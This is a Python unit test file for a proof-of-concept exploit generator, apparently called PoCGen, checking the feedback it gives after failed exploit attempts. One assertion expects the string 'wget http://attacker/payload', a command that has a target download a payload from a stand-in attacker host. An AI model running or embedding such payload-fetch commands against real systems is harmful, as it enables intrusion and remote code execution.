import unittest

from PoCGen.core.generator import _build_attempt_feedback
from PoCGen.core.models import ValidationResult


class TestAttemptFeedback(unittest.TestCase):
    def test_feedback_includes_parse_issues(self):
        feedback = _build_attempt_feedback([
            "Request #0: Content-Length mismatch"
        ], None, "http://attacker/payload", monitor_active=True)
        self.assertIn("Content-Length mismatch", feedback)
        self.assertIn("wget http://attacker/payload", feedback)

    def test_feedback_includes_validation_failures(self):
        validation = [
            ValidationResult(
                request_index=1,
                url="http://target/login",
                status_code=403,
                success=False,
                response_preview="Forbidden",
                error=None,
            )
        ]
        feedback = _build_attempt_feedback([], validation, "http://attacker/payload", monitor_active=False)
        self.assertIn("HTTP 403", feedback)
        self.assertIn("Forbidden", feedback)
        self.assertIn("monitor is unavailable", feedback)


if __name__ == "__main__":
    unittest.main()
